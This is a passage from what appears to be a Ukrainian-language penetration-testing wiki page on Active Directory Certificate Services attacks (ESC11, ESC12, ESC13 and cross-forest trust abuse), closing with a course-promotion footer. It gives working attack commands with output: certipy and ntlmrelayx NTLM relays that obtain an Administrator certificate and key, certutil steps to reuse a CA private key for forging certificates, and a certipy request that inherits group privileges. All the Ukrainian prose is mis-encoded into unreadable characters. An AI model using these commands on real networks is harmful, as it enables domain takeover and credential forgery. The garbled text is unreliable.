–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç–∞–∫–æ–∂ –ø–æ—à–∏—Ä—é—î—Ç—å—Å—è –Ω–∞ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –Ω–µ –º–∞—î `userPrincipalName` –∞–±–æ –¥–µ –≤—ñ–Ω –Ω–µ –∑–±—ñ–≥–∞—î—Ç—å—Å—è –∑ `sAMAccountName`, –ø—Ä–∏ —Ü—å–æ–º—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º `Administrator@corp.local` —î –æ—Å–Ω–æ–≤–Ω–æ—é –º—ñ—à–µ–Ω–Ω—é —á–µ—Ä–µ–∑ —Å–≤–æ—ó –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó LDAP —Ç–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `userPrincipalName` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.

## Relaying NTLM to ICPR - ESC11

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä CA –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ `IF_ENFORCEENCRYPTICERTREQUEST`, —Ü–µ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –∞—Ç–∞–∫ NTLM relay –±–µ–∑ –ø—ñ–¥–ø–∏—Å—É —á–µ—Ä–µ–∑ —Å–ª—É–∂–±—É RPC. [–ü–æ—Å–∏–ª–∞–Ω–Ω—è —Ç—É—Ç](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `certipy`, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤–∏–º–∫–Ω–µ–Ω–æ `Enforce Encryption for Requests`, —ñ certipy –ø–æ–∫–∞–∂–µ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### –°—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ü–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–µ—Ä–≤–µ—Ä —Ä–µ—Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
–ü—Ä–∏–º—ñ—Ç–∫–∞: –î–ª—è –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä—ñ–≤ –¥–æ–º–µ–Ω—É –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –≤–∫–∞–∑–∞—Ç–∏ `-template` –≤ DomainController.

–ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [—Ñ–æ—Ä–∫ sploutchy —ñ–º–ø–∞–∫—Ç—É](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell –¥–æ—Å—Ç—É–ø –¥–æ ADCS CA –∑ YubiHSM - ESC12

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –¶–µ–Ω—Ç—Ä —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –π–æ–≥–æ –Ω–∞ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É –ø—Ä–∏—Å—Ç—Ä–æ—ó, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, "Yubico YubiHSM2".

–Ø–∫—â–æ USB-–ø—Ä–∏—Å—Ç—Ä—ñ–π –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ CA —á–µ—Ä–µ–∑ USB-–ø–æ—Ä—Ç –∞–±–æ –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ USB —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä CA —î –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–æ—é –º–∞—à–∏–Ω–æ—é, –ø–æ—Ç—Ä—ñ–±–µ–Ω –∫–ª—é—á –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (—ñ–Ω–æ–¥—ñ –π–æ–≥–æ –Ω–∞–∑–∏–≤–∞—é—Ç—å "–ø–∞—Ä–æ–ª–µ–º") –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –ü—Ä–æ–≤–∞–π–¥–µ—Ä –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ –º—ñ–≥ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–ª—é—á—ñ –≤ YubiHSM.

–¶–µ–π –∫–ª—é—á/–ø–∞—Ä–æ–ª—å –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ —Ä–µ—î—Å—Ç—Ä—ñ –∑–∞ –∞–¥—Ä–µ—Å–æ—é `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ.

–ü–æ—Å–∏–ª–∞–Ω–Ω—è [—Ç—É—Ç](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### –°—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–Ø–∫—â–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á CA –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –Ω–∞ —Ñ—ñ–∑–∏—á–Ω–æ–º—É USB-–ø—Ä–∏—Å—Ç—Ä–æ—ó, –∫–æ–ª–∏ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–æ–ª–æ–Ω–∫–∏, –º–æ–∂–ª–∏–≤–æ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –∫–ª—é—á.

–°–ø–æ—á–∞—Ç–∫—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç CA (—Ü–µ –ø—É–±–ª—ñ—á–Ω–æ), –∞ –ø–æ—Ç—ñ–º:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
–ù–∞—Ä–µ—à—Ç—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É certutil `-sign`, —â–æ–± –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ –Ω–æ–≤–∏–π –¥–æ–≤—ñ–ª—å–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¶–° —Ç–∞ –π–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á.

## –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –≥—Ä—É–ø–∏ OID - ESC13

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ê—Ç—Ä–∏–±—É—Ç `msPKI-Certificate-Policy` –¥–æ–∑–≤–æ–ª—è—î –¥–æ–¥–∞—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É –≤–∏–¥–∞—á—ñ –¥–æ —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞. –û–±'—î–∫—Ç–∏ `msPKI-Enterprise-Oid`, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –∑–∞ –≤–∏–¥–∞—á—É –ø–æ–ª—ñ—Ç–∏–∫, –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ –ö–æ–Ω—Ç–µ–∫—Å—Ç—ñ –Ü–º–µ–Ω—É–≤–∞–Ω–Ω—è –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó (CN=OID,CN=Public Key Services,CN=Services) –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ PKI OID. –ü–æ–ª—ñ—Ç–∏–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ –≥—Ä—É–ø–æ—é AD, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∞—Ç—Ä–∏–±—É—Ç `msDS-OIDToGroupLink` —Ü—å–æ–≥–æ –æ–±'—î–∫—Ç–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Å–∏—Å—Ç–µ–º—ñ –∞–≤—Ç–æ—Ä–∏–∑—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –ø—Ä–µ–¥'—è–≤–ª—è—î —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, —Ç–∞–∫ –Ω—ñ–±–∏ –≤—ñ–Ω —î —á–ª–µ–Ω–æ–º –≥—Ä—É–ø–∏. [–ü–æ—Å–∏–ª–∞–Ω–Ω—è —Ç—É—Ç](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

–Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –≥—Ä—É–ø–æ—é OID, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —É—Å–ø–∞–¥–∫—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó —Ü—ñ—î—ó –≥—Ä—É–ø–∏.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), —â–æ–± –∑–Ω–∞–π—Ç–∏ OIDToGroupLink:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### –°—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ó–Ω–∞–π–¥—ñ—Ç—å –¥–æ–∑–≤–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `certipy find` –∞–±–æ `Certify.exe find /showAllPermissions`.

–Ø–∫—â–æ `John` –º–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é `VulnerableTemplate`, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —É—Å–ø–∞–¥–∫—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≥—Ä—É–ø–∏ `VulnerableGroup`.

–í—Å–µ, —â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –≤–∫–∞–∑–∞—Ç–∏ —à–∞–±–ª–æ–Ω, —ñ –≤—ñ–Ω –æ—Ç—Ä–∏–º–∞—î —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑ –ø—Ä–∞–≤–∞–º–∏ OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –ª—ñ—Å—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤, –ø–æ—è—Å–Ω–µ–Ω–∞ –≤ –ø–∞—Å–∏–≤–Ω–æ–º—É –≥–æ–ª–æ—Å—ñ

### –ü–æ—Ä—É—à–µ–Ω–Ω—è –¥–æ–≤—ñ—Ä–∏ –ª—ñ—Å—ñ–≤ —á–µ—Ä–µ–∑ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω—ñ –¶–ê

–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –¥–ª—è **–∫—Ä–æ—Å-–ª—ñ—Å–æ–≤–æ—ó —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** —î –≤—ñ–¥–Ω–æ—Å–Ω–æ –ø—Ä–æ—Å—Ç–æ—é. **–ö–æ—Ä–µ–Ω–µ–≤–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¶–ê** –∑ —Ä–µ—Å—É—Ä—Å–Ω–æ–≥–æ –ª—ñ—Å—É **–ø—É–±–ª—ñ–∫—É—î—Ç—å—Å—è –≤ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –ª—ñ—Å–∞—Ö** –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏, –∞ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–æ—ó –¶–ê** –∑ —Ä–µ—Å—É—Ä—Å–Ω–æ–≥–æ –ª—ñ—Å—É **–¥–æ–¥–∞—é—Ç—å—Å—è –¥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ `NTAuthCertificates` —Ç–∞ AIA –≤ –∫–æ–∂–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –ª—ñ—Å—ñ**. –î–ª—è —É—Ç–æ—á–Ω–µ–Ω–Ω—è, —Ü—è —É–≥–æ–¥–∞ –Ω–∞–¥–∞—î **–¶–ê –≤ —Ä–µ—Å—É—Ä—Å–Ω–æ–º—É –ª—ñ—Å—ñ –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å** –Ω–∞–¥ —É—Å—ñ–º–∞ —ñ–Ω—à–∏–º–∏ –ª—ñ—Å–∞–º–∏, –¥–ª—è —è–∫–∏—Ö –≤–æ–Ω–∞ —É–ø—Ä–∞–≤–ª—è—î PKI. –Ø–∫—â–æ —Ü—è –¶–ê –±—É–¥–µ **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏**, —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –¥–ª—è –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —è–∫ –≤ —Ä–µ—Å—É—Ä—Å–Ω–æ–º—É, —Ç–∞–∫ —ñ –≤ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –ª—ñ—Å–∞—Ö –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ –Ω–∏–º–∏**, —Ç–∏–º —Å–∞–º–∏–º –ø–æ—Ä—É—à—É—é—á–∏ –º–µ–∂—É –±–µ–∑–ø–µ–∫–∏ –ª—ñ—Å—É.

### –ü—Ä–∏–≤—ñ–ª–µ—ó —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó, –Ω–∞–¥–∞–Ω—ñ —ñ–Ω–æ–∑–µ–º–Ω–∏–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–º

–£ –±–∞–≥–∞—Ç–æ–ª—ñ—Å–æ–≤–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö –Ω–µ–æ–±—Ö—ñ–¥–Ω–∞ –æ–±–µ—Ä–µ–∂–Ω—ñ—Å—Ç—å —â–æ–¥–æ –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∏—Ö –¶–ê, —è–∫—ñ **–ø—É–±–ª—ñ–∫—É—é—Ç—å —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**, —â–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∞–±–æ —ñ–Ω–æ–∑–µ–º–Ω–∏–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–º** (–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º/–≥—Ä—É–ø–∞–º, —è–∫—ñ –Ω–µ –Ω–∞–ª–µ–∂–∞—Ç—å –¥–æ –ª—ñ—Å—É, –¥–æ —è–∫–æ–≥–æ –Ω–∞–ª–µ–∂–∏—Ç—å –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∞ –¶–ê) **–ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é —Ç–∞ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è**.\
–ü—ñ—Å–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –¥–æ–≤—ñ—Ä—É, **SID –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ —Ç–æ–∫–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –¥–æ–º–µ–Ω –º–∞—î –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫—É –¶–ê –∑ —à–∞–±–ª–æ–Ω–æ–º, —è–∫–∏–π **–¥–æ–∑–≤–æ–ª—è—î –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º**, —à–∞–±–ª–æ–Ω –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –±—É—Ç–∏ **–∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –∑ —ñ–Ω—à–æ–≥–æ –ª—ñ—Å—É**. –ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, —è–∫—â–æ **–ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é —è–≤–Ω–æ –Ω–∞–¥–∞–Ω—ñ —ñ–Ω–æ–∑–µ–º–Ω–æ–º—É –ø—Ä–∏–Ω—Ü–∏–ø—É —à–∞–±–ª–æ–Ω–æ–º**, **—Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∫—Ä–æ—Å-–ª—ñ—Å–æ–≤–∞ –≤—ñ–¥–Ω–æ—Å–∏–Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø—Ä–∏–Ω—Ü–∏–ø—É –∑ –æ–¥–Ω–æ–≥–æ –ª—ñ—Å—É **—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è –≤ —à–∞–±–ª–æ–Ω—ñ –∑ —ñ–Ω—à–æ–≥–æ –ª—ñ—Å—É**.

–û–±–∏–¥–≤–∞ —Å—Ü–µ–Ω–∞—Ä—ñ—ó –ø—Ä–∏–∑–≤–æ–¥—è—Ç—å –¥–æ **–∑–±—ñ–ª—å—à–µ–Ω–Ω—è –ø–ª–æ—â—ñ –∞—Ç–∞–∫–∏** –∑ –æ–¥–Ω–æ–≥–æ –ª—ñ—Å—É –≤ —ñ–Ω—à–∏–π. –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ —ñ–Ω–æ–∑–µ–º–Ω–æ–º—É –¥–æ–º–µ–Ω—ñ.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
